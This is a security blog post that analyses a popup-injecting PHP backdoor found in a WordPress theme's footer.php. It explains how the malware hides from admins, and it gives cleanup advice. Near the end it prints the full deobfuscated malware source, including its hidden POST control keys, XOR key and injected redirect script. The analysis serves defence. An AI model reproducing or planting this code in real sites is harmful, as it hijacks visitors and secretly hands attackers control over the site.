<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
  <link href="https://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="generator" content="Hugo 0.68.3" />

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Deobfuscating Wordpress Malware &middot; Eknoes Blog</title>
  <meta name="description" content="" />

  
  <link type="text/css" rel="stylesheet" href="https://eknoes.de/css/print.css" media="print">
  <link type="text/css" rel="stylesheet" href="https://eknoes.de/css/poole.css">
  <link type="text/css" rel="stylesheet" href="https://eknoes.de/css/syntax.css">
  <link type="text/css" rel="stylesheet" href="https://eknoes.de/css/hyde.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">


  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  
</head>

  <body class="theme-base-0c ">
  <aside class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <a href="https://eknoes.de/"><h1>Eknoes Blog</h1></a>
      <p class="lead">
       Graduate CS student with focus on Privacy &amp; Security topics 
      </p>
    </div>

    <nav>
      <ul class="sidebar-nav">
        <li><a href="https://eknoes.de/">Home</a> </li>
        <li><a href="/about"> About </a></li><li><a href="https://github.com/eknoes/"> Github </a></li><li><a href="https://twitter.com/soenke_hu"> Twitter </a></li>
      </ul>
    </nav>

    <p> </p>
  </div>
</aside>

    <main class="content container">
    <div class="post">
  <h1>Deobfuscating Wordpress Malware</h1>
  <time datetime=2017-07-08T09:00:12&#43;0100 class="post-date">Sat, Jul 8, 2017</time>
  <p>While browsing a friends website, I recognized malicious popups that opened up.
It was hard to reproduce, because they showed up quite rarely and my friend never noticed them.
Fortunately, I could convince her to have a look into her website by myself so I could analyze it and try to gain security.</p>
<p>I noticed strange, minified PHP-Code in the <code>footer.php</code> of the used theme. After reformatting was done,
analyzing it was quite easy.</p>
<h3 id="activity">Activity</h3>
<p>T he malware has an IP based filter to show the popup just to new users. That&rsquo;s why I was not able to reproduce it.
In Addition to that, it checks for certain Wordpress cookies. That&rsquo;s the reason my friend has never seen the popup.</p>
<p>If those tests fail, the malware injects Javascript into the page, which opens a Popup after the first click.</p>
<p>But that is not the only feature: The malware has a small Administration interface.
The attacker can change the website that opens up and read out the current one. By sending a POST-Request with
<code>8Yx5AefYpBp07TEocRmv=MaliciousWebsite.com</code> as parameter, <em><a href="http://maliciouswebsite.com">http://maliciouswebsite.com</a></em> is set. Adding the
parameter <code>https=true</code> leads to <em><a href="https://maliciouswebsite.com">https://maliciouswebsite.com</a></em>.
The XORed and base64-encoded url is written into <code>.SIc7CYwgY</code> or <code>/var/tmp/.SIc7CYwgY</code>,
if writing in the first file is not available.</p>
<p>If the POST-Request has the parameter <code>6FoNxbvo73BHOjhxokW3</code> the current URL is decoded and printed out.</p>
<p>A longer and more <a href="#detailed-report">detailed report</a> as well as the commented and formatted <a href="#code">source code</a> can be found at the end of the
article.</p>
<h3 id="intrusion-response--prevention">Intrusion Response &amp; Prevention</h3>
<p>To  remove the malware, it should be enough to delete the malicious part out of the <code>footer.php</code> and remove the
created files.</p>
<p>In Addition to that, you should definitely check the how the intruder came into your Wordpress. Change all the passwords,
and have a look around for obscure Wordpress Plugins or themes that you did not install. Furthermore, have a
look into your uploads folder for other, malicious files.</p>
<p>It is important to have Wordpress up-to-date, as the updates often fix security related issues. For system hardening,
you can identify possible issues with the open source tool <a href="https://github.com/wpscanteam/wpscan">wpscan</a>.</p>
<p>While searching for the malware, I found <a href="http://mventory.com/articles/hardening-wordpress-installation/">several</a>
<a href="https://blog.sucuri.net/2016/05/wordpress-redirect-hack-test0-default7.html">related</a>
<a href="https://stackoverflow.com/questions/44041853/wordpress-php-injection-hack">variants</a>, but the source code
differs. Both blog posts provide some security advices for Wordpress.</p>
<h2 id="detailed-report">Detailed Report</h2>
<h3 id="activity-1">Activity</h3>
<p>If cookies with the keys <code>wordpress_logged</code>, <code>wp-settings</code> or <code>wordpress_test</code> are set,
the malware aborts.
Otherwise, it checks whether the IP of the user exists in the file <code>ips1.txt</code>.
After that, it checks the IP File. If it contains more then 3000 IPs, it is truncated.</p>
<p>If the IP existed, the malware exits. Otherwise, it adds the IP to this file and decrypts the
domain, which was set. Now, Javascript is injected into the website, which will set an <code>onClick</code>-Listener for the Document.
After the first click, a popup opens with the decoded domain.</p>
<h3 id="administration-interface">Administration Interface</h3>
<p>There are two methods for administration: Reading out the current URL or setting a new one.</p>
<h4 id="post-request-with-6fonxbvo73bhojhxokw3">Post Request with <code>6FoNxbvo73BHOjhxokW3</code>:</h4>
<p>If a Post Request with this parameter is sent, the domain will be read out of the configuration files and printed in plain text.</p>
<h4 id="post-request-with-8yx5aefypbp07teocrmv">Post Request with <code>8Yx5AefYpBp07TEocRmv</code>:</h4>
<p>If a Post Request with this parameter is sent, a new domain is set and the <code>$_POST</code>-Array is printed.
The content of <code>8Yx5AefYpBp07TEocRmv</code> is the new domain in plain text without http(s).
If the Post parameter <code>https</code> is set, HTTPS is used. Otherwise, HTTP is used. The domain is written into the config file.
It is obscured with first an xor-operation with the XOR Key. The result is base64 encoded.</p>
<h3 id="created-files">Created Files</h3>
<ul>
<li><code>.SIc7CYwgY</code> - Stores current domain, encrypted</li>
<li><code>/var/tmp/.SIc7CYwgY</code> - Fallback for <code>.SIc7CYwgY</code></li>
<li><code>.ips1.txt</code> - IPs of User, that already got a Popup</li>
<li><code>/var/tmp/.ips1.txt</code> - Fallback for <code>.ips1.txt</code></li>
</ul>
<h3 id="other">Other</h3>
<p>XOR Key:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-text" data-lang="text">KQzLStQQblMU3rBGqFyEn8LlEWZ1G4vbK7YcpfZKrjaUQhP3sQKJHKaVLtr0H8RSP
PqbDqfNEQ0Yu08mHsI77NGcU5rbsMLNWwlqDXmM5E9WqY73rBvXwj5GkQay2wnuGc4w
FKYyYLMEhQDAG60aeYudKtUSUXDHYG912g0VWlYob3lycp0eC1QnoQe3xsWPbA3e1ZWY</code></pre></div></p>
<p>Domains are obscured by an XOR Operation with the key and base64 encoded after that.</p>
<h2 id="code">Code</h2>
<h3 id="introduction">Introduction</h3>
<p>There exist several unreachable statements, for example to redirect US based users to Google instead of the
malicious site or, my personal highlight in the redirect function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-php" data-lang="php">$r = rand(5, 20);
sleep($r);
echo &#34;&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;refresh&#39;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0; url=$url&#39;</span> /&gt;&#34;;
die();
die(&#34;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span>&gt;window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$url&#39;</span>&lt;/<span style="color:#f92672">script</span>&gt;&#34;);</code></pre></div>
<p>The intention is obviously to have the redirect happen after 5 to 20 seconds, but since it is PHP,
the page would just not stop loading for this time, and then have a redirect with javascript to the malicious url.</p>
<p>Imho, that indicates not a good insight into PHP.</p>
<h3 id="malware">Malware</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">/* 5pJQhrPh3XJCUOiaQCa6 */</span> <span style="color:#75715e">?&gt;&lt;?php</span>
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#66d9ef">E_ALL</span>);
$DOMAIN_FNAME1_7QNG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.SIc7CYwgY&#39;</span>; <span style="color:#75715e">// File to store current URL
</span><span style="color:#75715e"></span>$DOMAIN_FNAME2_7QNG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/tmp/.SIc7CYwgY&#39;</span>;


<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;6FoNxbvo73BHOjhxokW3&#39;</span>])) <span style="color:#75715e">// &#34;Admin Key&#34; to read current URL
</span><span style="color:#75715e"></span>{
    <span style="color:#a6e22e">check_status</span>($DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG);
    <span style="color:#66d9ef">return</span>;
} <span style="color:#66d9ef">else</span>
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;8Yx5AefYpBp07TEocRmv&#39;</span>])) <span style="color:#75715e">// &#34;Admin Key&#34; to write new URL
</span><span style="color:#75715e"></span>    {
        $domain <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;8Yx5AefYpBp07TEocRmv&#39;</span>];
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$domain\n</span><span style="color:#e6db74">&#34;</span>;
        <span style="color:#a6e22e">var_dump</span>($_POST);
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;https&#39;</span>])) {
            $domain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://</span><span style="color:#e6db74">$domain</span><span style="color:#e6db74">&#34;</span>;
        } <span style="color:#66d9ef">else</span> {
            $domain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">$domain</span><span style="color:#e6db74">&#34;</span>;
        }

        <span style="color:#66d9ef">echo</span> $domain;
        <span style="color:#a6e22e">save_str</span>($domain, $DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG);
        <span style="color:#66d9ef">return</span>;
    } <span style="color:#66d9ef">else</span> {
        $keys <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_keys</span>($_COOKIE);
        $cookies <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span>($keys);
        <span style="color:#75715e">// If User is logged in or similar, do nothing
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($cookies, <span style="color:#e6db74">&#34;wordpress_logged&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>($cookies, <span style="color:#e6db74">&#34;wp-settings&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>($cookies, <span style="color:#e6db74">&#34;wordpress_test&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#a6e22e">onClientConnect</span>($DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG);
        }
    }

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ip_is_there</span>($fname1, $fname2, $ip)
{
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($fname1) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($fname2)) {
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    }

    $contains <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname1, <span style="color:#e6db74">&#39;r&#39;</span>);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname2, <span style="color:#e6db74">&#39;r&#39;</span>);
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($file)) {
        $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($file);
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($line, $ip) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
            $contains <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
            <span style="color:#66d9ef">break</span>;
        }
    }

    <span style="color:#a6e22e">fclose</span>($file);
    <span style="color:#66d9ef">return</span> $contains;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">add_ip</span>($fname1, $fname2, $ip)
{
    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname1, <span style="color:#e6db74">&#39;a&#39;</span>);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname2, <span style="color:#e6db74">&#39;a&#39;</span>);
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#a6e22e">fwrite</span>($file, $ip);
    <span style="color:#a6e22e">fwrite</span>($file, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#a6e22e">fclose</span>($file);
}

<span style="color:#e6db74">/**
</span><span style="color:#e6db74"> * Checks if IP exists, if yes, nothing is shown. If not, Popup Code is injected and IP is added.
</span><span style="color:#e6db74"> * If more then 3000 IPs exist, file is deleted.
</span><span style="color:#e6db74"> * @param $DOMAIN_FNAME1_7QNG
</span><span style="color:#e6db74"> * @param $DOMAIN_FNAME2_7QNG
</span><span style="color:#e6db74"> *
</span><span style="color:#e6db74"> */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onClientConnect</span>($DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG)
{
    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
    $file1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./.ips1.txt&#34;</span>;
    $file1_b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/tmp/.ips1.txt&#34;</span>;
    $isIn1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    $isIn2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ip_is_there</span>($file1, $file1_b, $ip)) {
        $isIn1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
    }

    <span style="color:#a6e22e">count_lines_and_truncate</span>($file1, $file1_b);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$isIn1) {
        <span style="color:#a6e22e">add_ip</span>($file1, $file1_b, $ip);
        $domain <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_str</span>($DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG);
        <span style="color:#a6e22e">redirect</span>($domain);
    }

    <span style="color:#66d9ef">return</span>;
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$isIn1) {
        <span style="color:#a6e22e">add_ip</span>($file1, $file1_b, $ip);;
    } <span style="color:#66d9ef">else</span>
        <span style="color:#66d9ef">if</span> ($isIn1 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>$isIn2) {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_usa_ip</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>])) {
                $domain <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_str</span>($DOMAIN_FNAME1_7QNG, $DOMAIN_FNAME2_7QNG);
                $domain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://www.google.com/&#34;</span>;
                <span style="color:#a6e22e">redirect</span>($domain);
            }
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">return</span>;
        }
}

<span style="color:#e6db74">/**
</span><span style="color:#e6db74"> * Count lines of a file, if it has more then 3000, file is truncated
</span><span style="color:#e6db74"> * @param $fname1
</span><span style="color:#e6db74"> * @param $fname2
</span><span style="color:#e6db74"> * @return int
</span><span style="color:#e6db74"> */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">count_lines_and_truncate</span>($fname1, $fname2)
{
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($fname1) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($fname2)) {
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    }

    $line_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname1, <span style="color:#e6db74">&#39;r&#39;</span>);
    $fname <span style="color:#f92672">=</span> $fname1;
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname2, <span style="color:#e6db74">&#39;r&#39;</span>);
        $fname <span style="color:#f92672">=</span> $fname2;
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($file)) {
        $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($file);
        $line_count<span style="color:#f92672">++</span>;
    }

    <span style="color:#66d9ef">if</span> ($line_count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3000</span>) {
        <span style="color:#a6e22e">unlink</span>($fname);
        <span style="color:#a6e22e">ftruncate</span>($file, <span style="color:#ae81ff">0</span>);
    }

    <span style="color:#a6e22e">fclose</span>($file);
    <span style="color:#66d9ef">return</span> $line_count;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xor_enc</span>($str)
{
    $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;KQzLStQQblMU3rBGqFyEn8LlEWZ1G4vbK7YcpfZKrjaUQhP3sQKJHKaVLtr0H8RSPPqbDqfNEQ0Yu08mHsI77NGcU5rbsMLNWwlqDXmM5E9WqY73rBvXwj5GkQay2wnuGc4wFKYyYLMEhQDAG60aeYudKtUSUXDHYG912g0VWlYob3lycp0eC1QnoQe3xsWPbA3e1ZWY&#39;</span>;
    $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($str); $i<span style="color:#f92672">++</span>) {
        $res <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($str[$i]) <span style="color:#f92672">^</span> <span style="color:#a6e22e">ord</span>($key[$i]));
    }

    <span style="color:#66d9ef">return</span> $res;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enc</span>($str)
{
    $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">xor_enc</span>($str);
    $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>($res);
    <span style="color:#66d9ef">return</span> $res;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dec</span>($str)
{
    $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($str);
    $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">xor_enc</span>($str);
    <span style="color:#66d9ef">return</span> $res;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show_popup</span>($url)
{
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">&lt;script type=&#39;text/javascript&#39;&gt;
</span><span style="color:#e6db74">var t = false;
</span><span style="color:#e6db74">document.onclick= function(event) {
</span><span style="color:#e6db74">if (t) {
</span><span style="color:#e6db74">return;
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">t = true;
</span><span style="color:#e6db74">  if ( event === undefined) event= window.event;
</span><span style="color:#e6db74">  var target= &#39;target&#39; in event? event.target : event.srcElement;
</span><span style="color:#e6db74">  var win = window.open(&#39;</span><span style="color:#e6db74">$url</span><span style="color:#e6db74">&#39;, &#39;_blank&#39;);
</span><span style="color:#e6db74">  win.focus();
</span><span style="color:#e6db74">};
</span><span style="color:#e6db74"> &lt;/script&gt;
</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">redirect</span>($url)
{
    <span style="color:#a6e22e">show_popup</span>($url);
    <span style="color:#66d9ef">return</span>;
    $r <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">20</span>);
    <span style="color:#a6e22e">sleep</span>($r);
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;meta http-equiv=&#39;refresh&#39; content=&#39;0; url=</span><span style="color:#e6db74">$url</span><span style="color:#e6db74">&#39; /&gt;&#34;</span>;
    <span style="color:#66d9ef">die</span>();
    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;script type=&#39;text/javascript&#39;&gt;
</span><span style="color:#e6db74">           window.location = &#39;</span><span style="color:#e6db74">$url</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">      &lt;/script&gt;&#34;</span>);
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_status</span>($df1, $df2)
{
    $domain <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_str</span>($df1, $df2);
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Domain is: </span><span style="color:#e6db74">$domain\n</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read_str</span>($fname1, $fname2)
{
    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname1, <span style="color:#e6db74">&#39;r&#39;</span>);
    $name <span style="color:#f92672">=</span> $fname1;
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        $name <span style="color:#f92672">=</span> $fname2;
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname2, <span style="color:#e6db74">&#39;r&#39;</span>);
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        <span style="color:#66d9ef">return</span>;
    }

    $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($file, <span style="color:#a6e22e">filesize</span>($name));
    $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">dec</span>($str);
    <span style="color:#a6e22e">fclose</span>($file);
    <span style="color:#66d9ef">return</span> $str;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save_str</span>($str, $fname1, $fname2)
{
    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname1, <span style="color:#e6db74">&#39;w&#39;</span>);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($fname2, <span style="color:#e6db74">&#39;w&#39;</span>);
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$file) {
        <span style="color:#66d9ef">return</span>;
    }

    $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">enc</span>($str);
    <span style="color:#a6e22e">fwrite</span>($file, $str);
    <span style="color:#a6e22e">fclose</span>($file);
} <span style="color:#75715e">?&gt;</span>

<span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">/* uqjsQSyWVhmOHAEVa1i6 */</span> <span style="color:#75715e">?&gt;</span>
</code></pre></div>
</div>


    </main>

    
      
    
  </body>
</html>
